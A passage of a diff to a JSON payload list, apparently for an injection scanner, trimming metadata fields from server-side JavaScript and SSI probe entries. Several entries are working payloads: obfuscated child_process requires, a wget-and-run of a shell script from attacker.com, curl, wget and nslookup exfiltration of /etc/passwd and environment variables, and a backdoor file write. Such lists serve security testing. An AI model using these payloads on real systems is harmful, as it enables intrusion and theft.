     "name": "res.render with unsafe data #3",
     "template": "{{user.input}}",
-    "description": "res.render with unsafe data probe from OWASP. Tests application handling of: {{user.input}}",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "res.render with unsafe data probe from OWASP. Tests application handling of: {{user.input}}"
   },
   {
     "id": "ssji-owasp-0151",
     "name": "22. WEBPACK/BUNDLER SPECIFIC",
     "template": "__webpack_require__",
-    "description": "22. WEBPACK/BUNDLER SPECIFIC probe from OWASP. Tests application handling of: __webpack_require__",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "22. WEBPACK/BUNDLER SPECIFIC probe from OWASP. Tests application handling of: __webpack_require__"
   },
   {
     "id": "ssji-owasp-0152",
     "name": "22. WEBPACK/BUNDLER SPECIFIC #2",
     "template": "__non_webpack_require__",
-    "description": "22. WEBPACK/BUNDLER SPECIFIC probe from OWASP. Tests application handling of: __non_webpack_require__",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "22. WEBPACK/BUNDLER SPECIFIC probe from OWASP. Tests application handling of: __non_webpack_require__"
   },
   {
     "id": "ssji-owasp-0153",
     "name": "23. ELECTRON SPECIFIC",
     "template": "require('electron').remote.require('child_process')",
-    "description": "23. ELECTRON SPECIFIC probe from OWASP. Tests application handling of: require('electron').remote.req...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "23. ELECTRON SPECIFIC probe from OWASP. Tests application handling of: require('electron').remote.req..."
   },
   {
     "id": "ssji-owasp-0154",
     "name": "23. ELECTRON SPECIFIC #2",
     "template": "require('electron').ipcRenderer.send('exploit')",
-    "description": "23. ELECTRON SPECIFIC probe from OWASP. Tests application handling of: require('electron').ipcRendere...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "23. ELECTRON SPECIFIC probe from OWASP. Tests application handling of: require('electron').ipcRendere..."
   },
   {
     "id": "ssji-owasp-0155",
     "name": "String concatenation",
     "template": "req+'uire'('child_'+'process').exec('whoami')",
-    "description": "String concatenation probe from OWASP. Tests application handling of: req+'uire'('child_'+'process')...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "String concatenation probe from OWASP. Tests application handling of: req+'uire'('child_'+'process')..."
   },
   {
     "id": "ssji-owasp-0156",
     "name": "Unicode escaping",
     "template": "require('\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073')",
-    "description": "Unicode escaping probe from OWASP. Tests application handling of: require('\\u0063\\u0068\\u0069\\u0...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Unicode escaping probe from OWASP. Tests application handling of: require('\\u0063\\u0068\\u0069\\u0..."
   },
   {
     "id": "ssji-owasp-0157",
     "name": "Hex encoding",
     "template": "require(Buffer.from('6368696c645f70726f63657373', 'hex').toString())",
-    "description": "Hex encoding probe from OWASP. Tests application handling of: require(Buffer.from('6368696c6...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Hex encoding probe from OWASP. Tests application handling of: require(Buffer.from('6368696c6..."
   },
   {
     "id": "ssji-owasp-0158",
     "name": "Base64",
     "template": "require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString())",
-    "description": "Base64 probe from OWASP. Tests application handling of: require(Buffer.from('Y2hpbGRfc...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Base64 probe from OWASP. Tests application handling of: require(Buffer.from('Y2hpbGRfc..."
   },
   {
     "id": "ssji-owasp-0159",
     "name": "Computed property access",
     "template": "global['pro'+'cess'].mainModule['req'+'uire']('child_process')",
-    "description": "Computed property access probe from OWASP. Tests application handling of: global['pro'+'cess'].mainModul...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Computed property access probe from OWASP. Tests application handling of: global['pro'+'cess'].mainModul..."
   },
   {
     "id": "ssji-owasp-0160",
     "name": "25. NESTING AND CHAINING",
     "template": "require('child_process').exec('wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh')",
-    "description": "25. NESTING AND CHAINING probe from OWASP. Tests application handling of: require('child_process').exec(...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "25. NESTING AND CHAINING probe from OWASP. Tests application handling of: require('child_process').exec(..."
   },
   {
     "id": "ssji-owasp-0161",
     "name": "25. NESTING AND CHAINING #2",
     "template": "require('child_process').execSync('curl attacker.com/$(cat /etc/passwd | base64)').toString()",
-    "description": "25. NESTING AND CHAINING probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "25. NESTING AND CHAINING probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0162",
     "name": "26. TIME-BASED BLIND SSJI",
     "template": "require('child_process').execSync('sleep 5')",
-    "description": "26. TIME-BASED BLIND SSJI probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "26. TIME-BASED BLIND SSJI probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0163",
     "name": "26. TIME-BASED BLIND SSJI #2",
     "template": "setTimeout(function(){}, 5000)",
-    "description": "26. TIME-BASED BLIND SSJI probe from OWASP. Tests application handling of: setTimeout(function(){}, 5000)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "26. TIME-BASED BLIND SSJI probe from OWASP. Tests application handling of: setTimeout(function(){}, 5000)"
   },
   {
     "id": "ssji-owasp-0164",
     "name": "26. TIME-BASED BLIND SSJI #3",
     "template": "require('child_process').execSync('ping -c 5 attacker.com')",
-    "description": "26. TIME-BASED BLIND SSJI probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "26. TIME-BASED BLIND SSJI probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0165",
     "name": "27. OUT-OF-BAND DATA EXFILTRATION",
     "template": "require('child_process').execSync('curl attacker.com -d \"$(cat /etc/passwd)\"')",
-    "description": "27. OUT-OF-BAND DATA EXFILTRATION probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "27. OUT-OF-BAND DATA EXFILTRATION probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0166",
     "name": "27. OUT-OF-BAND DATA EXFILTRATION #2",
     "template": "require('child_process').execSync('wget --post-data=\"$(env)\" attacker.com')",
-    "description": "27. OUT-OF-BAND DATA EXFILTRATION probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "27. OUT-OF-BAND DATA EXFILTRATION probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0167",
     "name": "27. OUT-OF-BAND DATA EXFILTRATION #3",
     "template": "require('child_process').execSync('nslookup $(whoami).attacker.com')",
-    "description": "27. OUT-OF-BAND DATA EXFILTRATION probe from OWASP. Tests application handling of: require('child_process').execS...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "27. OUT-OF-BAND DATA EXFILTRATION probe from OWASP. Tests application handling of: require('child_process').execS..."
   },
   {
     "id": "ssji-owasp-0168",
     "name": "28. WRITESTREAM FOR PERSISTENCE",
     "template": "require('fs').createWriteStream('/tmp/backdoor.js').write('malicious code')",
-    "description": "28. WRITESTREAM FOR PERSISTENCE probe from OWASP. Tests application handling of: require('fs').createWriteStrea...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "28. WRITESTREAM FOR PERSISTENCE probe from OWASP. Tests application handling of: require('fs').createWriteStrea..."
   },
   {
     "id": "ssji-owasp-0169",
     "name": "29. REGEX DOS (ReDoS) via SSJI",
     "template": "/(a+)+b/.test('aaaaaaaaaaaaaaaaaaaaaa!')",
-    "description": "29. REGEX DOS (ReDoS) via SSJI probe from OWASP. Tests application handling of: /(a+)+b/.test('aaaaaaaaaaaaaaa...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "29. REGEX DOS (ReDoS) via SSJI probe from OWASP. Tests application handling of: /(a+)+b/.test('aaaaaaaaaaaaaaa..."
   },
   {
     "id": "ssji-owasp-0170",
     "name": "29. REGEX DOS (ReDoS) via SSJI #2",
     "template": "/(a|a)*b/.test('aaaaaaaaaaaaaaaaaaaaaa!')",
-    "description": "29. REGEX DOS (ReDoS) via SSJI probe from OWASP. Tests application handling of: /(a|a)*b/.test('aaaaaaaaaaaaaa...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "29. REGEX DOS (ReDoS) via SSJI probe from OWASP. Tests application handling of: /(a|a)*b/.test('aaaaaaaaaaaaaa..."
   },
   {
     "id": "ssji-owasp-0171",
     "name": "Detection payloads",
     "template": "throw new Error('SSJI Test')",
-    "description": "Detection payloads probe from OWASP. Tests application handling of: throw new Error('SSJI Test')",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Detection payloads probe from OWASP. Tests application handling of: throw new Error('SSJI Test')"
   },
   {
     "id": "ssji-owasp-0172",
     "name": "Detection payloads #2",
     "template": "console.log('SSJI_TEST_' + Date.now())",
-    "description": "Detection payloads probe from OWASP. Tests application handling of: console.log('SSJI_TEST_' + Dat...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Detection payloads probe from OWASP. Tests application handling of: console.log('SSJI_TEST_' + Dat..."
   },
   {
     "id": "ssji-owasp-0173",
     "name": "Detection payloads #3",
     "template": "require('fs').writeFileSync('/tmp/ssji_test_' + Date.now(), 'test')",
-    "description": "Detection payloads probe from OWASP. Tests application handling of: require('fs').writeFileSync('/...",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Detection payloads probe from OWASP. Tests application handling of: require('fs').writeFileSync('/..."
   },
   {
     "id": "ssji-owasp-0174",
     "name": "Simple arithmetic to confirm execution",
     "template": "7*7",
-    "description": "Simple arithmetic to confirm execution probe from OWASP. Tests application handling of: 7*7",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Simple arithmetic to confirm execution probe from OWASP. Tests application handling of: 7*7"
   },
   {
     "id": "ssji-owasp-0175",
     "name": "Simple arithmetic to confirm execution #2",
     "template": "Math.sqrt(16)",
-    "description": "Simple arithmetic to confirm execution probe from OWASP. Tests application handling of: Math.sqrt(16)",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Simple arithmetic to confirm execution probe from OWASP. Tests application handling of: Math.sqrt(16)"
   },
   {
     "id": "ssji-owasp-0176",
     "name": "Simple arithmetic to confirm execution #3",
     "template": "[1,2,3].join(',')",
-    "description": "Simple arithmetic to confirm execution probe from OWASP. Tests application handling of: [1,2,3].join(',')",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "ssji-payloads.txt"
+    "description": "Simple arithmetic to confirm execution probe from OWASP. Tests application handling of: [1,2,3].join(',')"
   },
   {
     "id": "ssji-patt-0177",
     "name": "Ssi Esi #1",
     "template": "<!--#config errmsg=\"File not found, informs users and password\"-->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#config errmsg=\"File not found, info...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#config errmsg=\"File not found, info..."
   },
   {
     "id": "ssji-patt-0178",
     "name": "Ssi Esi #2",
     "template": "<!--#config timefmt=\"A %B %d %Y %r\"-->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#config timefmt=\"A %B %d %Y %r\"-->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#config timefmt=\"A %B %d %Y %r\"-->"
   },
   {
     "id": "ssji-patt-0179",
     "name": "Ssi Esi #3",
     "template": "<!--#echo var=\"DATE_LOCAL\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"DATE_LOCAL\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"DATE_LOCAL\" -->"
   },
   {
     "id": "ssji-patt-0180",
     "name": "Ssi Esi #4",
     "template": "<!--#echo var=\"DOCUMENT_NAME\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"DOCUMENT_NAME\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"DOCUMENT_NAME\" -->"
   },
   {
     "id": "ssji-patt-0181",
     "name": "Ssi Esi #5",
     "template": "<!--#echo var=\"DOCUMENT_URI\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"DOCUMENT_URI\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"DOCUMENT_URI\" -->"
   },
   {
     "id": "ssji-patt-0182",
     "name": "Ssi Esi #6",
     "template": "<!--#echo var=\"auth_type\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"auth_type\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"auth_type\" -->"
   },
   {
     "id": "ssji-patt-0183",
     "name": "Ssi Esi #7",
     "template": "<!--#echo var=\"content_length\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"content_length\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"content_length\" -->"
   },
   {
     "id": "ssji-patt-0184",
     "name": "Ssi Esi #8",
     "template": "<!--#echo var=\"content_type\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"content_type\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"content_type\" -->"
   },
   {
     "id": "ssji-patt-0185",
     "name": "Ssi Esi #9",
     "template": "<!--#echo var=\"date_gmt\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"date_gmt\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"date_gmt\" -->"
   },
   {
     "id": "ssji-patt-0186",
     "name": "Ssi Esi #10",
     "template": "<!--#echo var=\"date_local\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"date_local\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"date_local\" -->"
   },
   {
     "id": "ssji-patt-0187",
     "name": "Ssi Esi #11",
     "template": "<!--#echo var=\"document_name\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"document_name\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"document_name\" -->"
   },
   {
     "id": "ssji-patt-0188",
     "name": "Ssi Esi #12",
     "template": "<!--#echo var=\"document_root\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"document_root\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"document_root\" -->"
   },
   {
     "id": "ssji-patt-0189",
     "name": "Ssi Esi #13",
     "template": "<!--#echo var=\"document_uri\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"document_uri\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"document_uri\" -->"
   },
   {
     "id": "ssji-patt-0190",
     "name": "Ssi Esi #14",
     "template": "<!--#echo var=\"forwarded\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"forwarded\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"forwarded\" -->"
   },
   {
     "id": "ssji-patt-0191",
     "name": "Ssi Esi #15",
     "template": "<!--#echo var=\"from\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"from\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"from\" -->"
   },
   {
     "id": "ssji-patt-0192",
     "name": "Ssi Esi #16",
     "template": "<!--#echo var=\"gateway_interface\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"gateway_interface\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"gateway_interface\" -->"
   },
   {
     "id": "ssji-patt-0193",
     "name": "Ssi Esi #17",
     "template": "<!--#echo var=\"http_accept\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_accept\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_accept\" -->"
   },
   {
     "id": "ssji-patt-0194",
     "name": "Ssi Esi #18",
     "template": "<!--#echo var=\"http_accept_charset\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_accept_charset\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_accept_charset\" -->"
   },
   {
     "id": "ssji-patt-0195",
     "name": "Ssi Esi #19",
     "template": "<!--#echo var=\"http_accept_encoding\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_accept_encoding\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_accept_encoding\" -->"
   },
   {
     "id": "ssji-patt-0196",
     "name": "Ssi Esi #20",
     "template": "<!--#echo var=\"http_accept_language\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_accept_language\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_accept_language\" -->"
   },
   {
     "id": "ssji-patt-0197",
     "name": "Ssi Esi #21",
     "template": "<!--#echo var=\"http_client_ip\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_client_ip\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_client_ip\" -->"
   },
   {
     "id": "ssji-patt-0198",
     "name": "Ssi Esi #22",
     "template": "<!--#echo var=\"http_connection\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_connection\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_connection\" -->"
   },
   {
     "id": "ssji-patt-0199",
     "name": "Ssi Esi #23",
     "template": "<!--#echo var=\"http_cookie\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_cookie\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_cookie\" -->"
   },
   {
     "id": "ssji-patt-0200",
     "name": "Ssi Esi #24",
     "template": "<!--#echo var=\"http_form\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_form\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_form\" -->"
   },
   {
     "id": "ssji-patt-0201",
     "name": "Ssi Esi #25",
     "template": "<!--#echo var=\"http_host\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_host\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_host\" -->"
   },
   {
     "id": "ssji-patt-0202",
     "name": "Ssi Esi #26",
     "template": "<!--#echo var=\"http_referer\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_referer\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_referer\" -->"
   },
   {
     "id": "ssji-patt-0203",
     "name": "Ssi Esi #27",
     "template": "<!--#echo var=\"http_ua_cpu\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_ua_cpu\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_ua_cpu\" -->"
   },
   {
     "id": "ssji-patt-0204",
     "name": "Ssi Esi #28",
     "template": "<!--#echo var=\"http_ua_os\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_ua_os\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_ua_os\" -->"
   },
   {
     "id": "ssji-patt-0205",
     "name": "Ssi Esi #29",
     "template": "<!--#echo var=\"http_user_agent\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_user_agent\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"http_user_agent\" -->"
   },
   {
     "id": "ssji-patt-0206",
     "name": "Ssi Esi #30",
     "template": "<!--#echo var=\"last_modified\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"last_modified\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"last_modified\" -->"
   },
   {
     "id": "ssji-patt-0207",
     "name": "Ssi Esi #31",
     "template": "<!--#echo var=\"netsite_root\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"netsite_root\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"netsite_root\" -->"
   },
   {
     "id": "ssji-patt-0208",
     "name": "Ssi Esi #32",
     "template": "<!--#echo var=\"page_count\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"page_count\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"page_count\" -->"
   },
   {
     "id": "ssji-patt-0209",
     "name": "Ssi Esi #33",
     "template": "<!--#echo var=\"path\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"path\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"path\" -->"
   },
   {
     "id": "ssji-patt-0210",
     "name": "Ssi Esi #34",
     "template": "<!--#echo var=\"path_info\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"path_info\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"path_info\" -->"
   },
   {
     "id": "ssji-patt-0211",
     "name": "Ssi Esi #35",
     "template": "<!--#echo var=\"path_info_translated\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"path_info_translated\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"path_info_translated\" -->"
   },
   {
     "id": "ssji-patt-0212",
     "name": "Ssi Esi #36",
     "template": "<!--#echo var=\"path_translated\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"path_translated\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"path_translated\" -->"
   },
   {
     "id": "ssji-patt-0213",
     "name": "Ssi Esi #37",
     "template": "<!--#echo var=\"query_string\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"query_string\" -->",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"query_string\" -->"
   },
   {
     "id": "ssji-patt-0214",
     "name": "Ssi Esi #38",
     "template": "<!--#echo var=\"query_string_unescaped\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"query_string_unescaped\" -...",
-    "enabled": true,
-    "sourceType": "PayloadsAllTheThings",
-    "sourceFile": "ssi_esi.txt"
+    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"query_string_unescaped\" -..."
   },
   {
     "id": "ssji-patt-0215",
     "name": "Ssi Esi #39",
     "template": "<!--#echo var=\"remote_addr\" -->",
-    "description": "SSJI payload from PayloadsAllTheThings (Ssi Esi). Target: <!--#echo var=\"remote_addr\" -->",
-    "enabled": true,
